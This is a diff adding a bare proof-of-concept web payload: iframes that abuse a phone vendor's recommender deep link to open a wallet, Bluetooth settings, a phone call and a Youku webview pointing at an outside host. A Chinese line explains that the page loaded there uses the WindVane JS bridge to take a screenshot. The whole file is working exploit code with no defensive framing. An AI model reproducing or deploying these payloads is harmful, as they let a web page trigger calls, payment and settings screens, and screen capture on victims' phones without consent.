@@ -1,0 +1,15 @@
+<iframe src="xiaoyirecommender://wisemarket/notifybar?h5_link=11&channelId=11&deep_link=payment://com.huawei/wallet&push_service=11"></iframe>
+<iframe src="xiaoyirecommender://wisemarket/notifybar?h5_link=11&channelId=11&deep_link=settings://com.android.settings.slices?slice=content://android.settings.slices/action/bluetooth&push_service=11"></iframe>
+<iframe src="xiaoyirecommender://wisemarket/notifybar?h5_link=11&channelId=11&deep_link=tel://137xxxx9960&push_service=11"></iframe>
+<iframe src="xiaoyirecommender://wisemarket/notifybar?h5_link=11&channelId=11&deep_link=youku://ucadwebview?url=https://gwoxoxdr.x.6cm.fun/youkutest&push_service=11"></iframe>
+其中，youkutest网页的内容是：
+<script>
+new Function(__windvane__.windVaneCoreJs())(); // 初始化windVane      
+var params = {        inAlbum:true,        type:'app'      };      
+window.__windvane__.call('WVScreen.capture', params, function(e) { // 调用截屏Api      
+alert('success: ' + JSON.stringify(e));
+}, 
+function(e) {
+alert('failure: ' + JSON.stringify(e));
+});
+</script>
